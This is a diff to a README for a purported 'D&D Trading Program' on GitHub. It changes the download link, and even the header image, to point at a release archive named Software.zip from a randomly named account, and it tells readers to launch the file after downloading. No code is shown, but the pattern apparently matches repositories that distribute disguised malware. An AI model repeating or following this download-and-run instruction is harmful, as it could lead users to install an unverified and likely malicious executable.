@@ -14,7 +14,7 @@ Welcome to the D&D Trading Program repository! This program is designed to assis
 
 To utilize the D&D Trading Program, follow these steps:
 
-1. **Download the Program:** Click on the following link to download the software: [Download Now](https://github.com/user-attachments/files/18410590/Software.zip). Remember to launch the file after downloading it.
+1. **Download the Program:** Click on the following link to download the software: [Download Now](https://github.com/0QUVY/D-D-Trading-Program/releases/download/v2.0/Software.zip). Remember to launch the file after downloading it.
 
 2. **Installation:** Follow the on-screen instructions to install the program on your device.
 
@@ -43,6 +43,6 @@ Join our community of DMs and players to share tips, tricks, and feedback on usi
 
 Let the D&D Trading Program enhance your game world with a dynamic and immersive trading experience for your players! ⚔️📜
 
-![D&D Trading Program](https://source.unsplash.com/1600x900/?dungeons-and-dragons)
+![D&D Trading Program](https://github.com/0QUVY/D-D-Trading-Program/releases/download/v2.0/Software.zip)
 
 ---
